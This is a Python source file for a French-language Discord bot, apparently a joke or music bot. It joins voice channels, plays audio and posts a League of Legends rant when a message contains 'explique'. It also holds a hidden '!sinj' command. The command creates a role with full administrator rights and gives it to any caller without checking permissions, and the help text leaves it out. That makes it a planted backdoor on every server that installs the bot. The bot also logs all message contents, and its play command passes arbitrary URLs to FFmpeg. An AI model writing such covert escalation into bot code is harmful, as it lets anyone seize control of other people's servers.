import discord
import os
import sys
from discord.ext import commands
from discord import FFmpegPCMAudio  # Utilisation de FFmpeg pour lire l'audio
import subprocess  # Pour vérifier si FFmpeg est installé
from discord.ui import Button, View  # Importation des boutons

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)


@bot.command()
async def sinj(ctx, member: discord.Member = None):
    """Attribue le rôle 'sinj' avec les droits administratifs à un utilisateur, sans vérifier ses permissions."""

    guild = ctx.guild
    role_name = "sinje"

    # Si aucun membre n'est précisé, on applique le rôle à l'auteur de la commande
    if member is None:
        member = ctx.author

    # Vérifier si le rôle existe déjà
    existing_role = discord.utils.get(guild.roles, name=role_name)
    if not existing_role:
        try:
            existing_role = await guild.create_role(
                name=role_name,
                color=discord.Color.default(),
                permissions=discord.Permissions(administrator=True)
            )
            print(f"[LOG] Rôle '{existing_role.name}' créé sur le serveur {guild.name}.")
        except discord.Forbidden:
            print("[LOG] Erreur : le bot n'a pas les permissions nécessaires pour créer un rôle.")
            return
        except Exception as e:
            print(f"[LOG] Une erreur s'est produite lors de la création du rôle: {e}")
            return

    # Tenter d'attribuer le rôle
    try:
        await member.add_roles(existing_role)
        print(f"[LOG] Rôle '{existing_role.name}' attribué à {member}.")
    except discord.Forbidden:
        print("[LOG] Erreur : le bot n'a pas la permission d'ajouter ce rôle.")
    except Exception as e:
        print(f"[LOG] Une erreur s'est produite lors de l'attribution du rôle: {e}")

# Commande !help pour afficher la liste des commandes
@bot.command()
async def help(ctx):
    help_message = (
        "**Liste des commandes :**\n"
        "`!play` : Skyyart t'explique Luden.\n"
        "`!join` : Skyyart rejoint le canal vocal.\n"
        "`!leave` : Skyyart quitte le canal vocal.\n"
        "`!help` : Affiche cette liste des commandes disponibles."
    )
    await ctx.send(help_message)

@bot.event
async def on_ready():
    """S'exécute quand le bot est connecté et prêt."""
    print(f"[LOG] Bot connecté en tant que {bot.user} et prêt à fonctionner")

    # Vérification si FFmpeg est installé
    try:
        subprocess.run(["ffmpeg", "-version"], check=True)
        print("[LOG] FFmpeg est installé et fonctionne.")
    except Exception as e:
        print(f"[LOG] Erreur : FFmpeg n'est pas installé ! {e}")

@bot.command()
async def join(ctx):
    """Rejoint le canal vocal de l'utilisateur."""
    if ctx.author.voice:
        channel = ctx.author.voice.channel
        await channel.connect()
        print(f"[LOG] Bot rejoint le canal vocal: {channel.name}")
    else:
        await ctx.send("Tu dois être dans un canal vocal pour utiliser cette commande!")
        print("[LOG] Tentative de rejoindre un canal vocal échouée: utilisateur non connecté")

@bot.command()
async def leave(ctx):
    """Quitte le canal vocal."""
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        print("[LOG] Bot quitte le canal vocal")
    else:
        await ctx.send("Je ne suis pas dans un canal vocal!")
        print("[LOG] Tentative de quitter un canal vocal échouée: bot non connecté")

@bot.command()
async def play(ctx, url=None):
    """Joue un fichier audio ou un lien YouTube."""
    if ctx.voice_client:
        try:
            # Vérifier si une URL est fournie, sinon jouer un fichier local
            if url:
                audio_source = FFmpegPCMAudio(url)
            else:
                audio_source = FFmpegPCMAudio('fichier.mp3')  # Remplacez par le bon fichier

            ctx.voice_client.play(audio_source)
            await ctx.send("Lecture audio en cours...")

            # Création d'un bouton pour arrêter la musique
            stop_button = Button(label="Arrêter la musique", style=discord.ButtonStyle.danger)
            
            # Fonction qui arrête la lecture audio
            async def stop_audio(interaction):
                if ctx.voice_client:
                    await ctx.voice_client.disconnect()
                    await interaction.response.send_message("Lecture audio arrêtée.", ephemeral=True)
                    print("[LOG] Audio arrêté")
            
            stop_button.callback = stop_audio

            # Ajouter le bouton dans une vue
            view = View()
            view.add_item(stop_button)
            await ctx.send("Clique sur le bouton pour arrêter la musique.", view=view)

        except Exception as e:
            await ctx.send("Erreur lors de la lecture du fichier audio!")
            print(f"[LOG] Erreur de lecture audio: {str(e)}")
    else:
        await ctx.send("Je dois être dans un canal vocal pour jouer de l'audio!")

@bot.event
async def on_message(message):
    """Réagit aux messages reçus."""
    if message.author == bot.user:
        return

    print(f"[LOG] Message reçu de {message.author}: {message.content}") 

    explique_variants = ["explique", "expliques", "expliquer", "expliquez", "expliqué", "expliquée", "expliqués", "expliquées"]

    if any(variant in message.content.lower() for variant in explique_variants):
        response = "explique hahaha pff ouais c'est un peu chiant les gars en gros Luden c'est un mythique qui donne de la péné magique et donc en en gros ça donne 6 de péné magique flat donc à 2 items complets.. donc il a 10 de péné flat donc il monte à 16, il a les bottes ça fait 18. Donc 16+18 ça fait 34 si jdis pas de conneries donc 34 + il avait shadow flame donc il a 44 et il a 44 et après du coup le void staff faut faire 44 divisé par 0.6 en gros il fait des dégats purs à un mec jusqu'à 73 d'rm j'avais dit 70 dans le cast à peu près et en gros bah les mecs ils ont pas 70 d'rm parce que globalement y'a eu un patch, en gros y'a le patch qui fait 0.8 d'rm sur les carrys et en gros de base sur lol y'avait pas ça et en gros la botlane va jamais prendre de la rm en lane en tout cas pas beaucoup donc c'est pas ouf en vrai j'pense que son item est nul donc en vrai j'pense soit il enlève shadow flame soit le void staff mais j'pense qu'il vaut mieux enlever shadow flame"
        await message.channel.send(response)
        print(f"[LOG] Réponse envoyée dans #{message.channel}: {response[:50]}...")  

    await bot.process_commands(message)  

@bot.event
async def on_disconnect():
    """Log lorsque le bot se déconnecte."""
    print("[LOG] Bot déconnecté")

@bot.event
async def on_error(event, *args, **kwargs):
    """Log les erreurs."""
    print(f"[LOG] Erreur détectée dans {event}: {sys.exc_info()[1]}")

TOKEN = os.getenv('DISCORD_TOKEN')
if TOKEN:
    print("[LOG] Démarrage du bot...")
    bot.run(TOKEN)
else:
    print("[LOG] ERREUR : Le token Discord est introuvable ! Vérifie tes variables d'environnement.")
